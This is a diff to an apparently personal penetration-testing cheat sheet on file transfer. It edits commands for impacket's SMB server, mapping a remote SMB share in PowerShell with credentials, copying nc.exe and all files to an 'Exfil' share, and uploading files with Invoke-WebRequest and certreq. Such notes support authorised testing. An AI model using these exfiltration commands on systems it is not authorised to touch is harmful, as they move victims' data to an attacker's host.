@@ -17,8 +17,8 @@ $ python3 -m uploadserver [<PORT>] --server-certificate ~/<key>.pem
 Refer #self-signed-certificates to create such certs.
 ## SMB Server:
 ```shell-session
-$ sudo impacket-smbserver -smb2support SHARE_NAME RUN_DIR
-$ sudo impacket-smbserver -smb2support share $(pwd) [-user ''] [-password '']
+$ impacket-smbserver -smb2support SHARE_NAME RUN_DIR
+$ impacket-smbserver -smb2support share $(pwd) [-user ''] [-password '']
 ```
 ## Nginx Server
 Create `/etc/nginx/sites-available/upload.conf` with the contents:
@@ -70,9 +70,14 @@ $ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <file>
 > net use n: \\IP\shareName /user:test password
 > copy n:\nc.exe
 ```
+Map remote SMB server to system.
 ```Powershell
-PS C:\> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME"
-PS C:\> New-PSDrive -Name "Exfil" -PsProvider "Filesystem" -Root "\\10.10.14.195\share"
+$Username = "Username" 
+$Password = "Password" 
+$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)
+
+PS C:\> New-PSDrive -Name "SHARE_NAME" -PsProvider "Filesystem" -Root "\\YOUR_IP\YOUR_SHARE_NAME" [-Credential $Credential] [-Persist]
 PS C:\> copy * Exfil:\
 ```
 ## Copy
@@ -298,7 +303,7 @@ PS > Invoke-WebRequest -Uri 'http://<IP>[:<PORT>]/upload' -Method POST -InFile '
 PS > Invoke-RestMethod -Uri 'http://<IP>[:<PORT>]/upload' -Method POST -InFile '.\file' -ContentType 'multipart/form-data'
 ```
 ### CertReq
-Used with [[#Servers#Netcat]]
+Used with [[#Servers#Netcat|Netcat Server]]
 ```powershell
 > certreq.exe -Post -config http://<IP>[:<PORT>]/ file
 ```
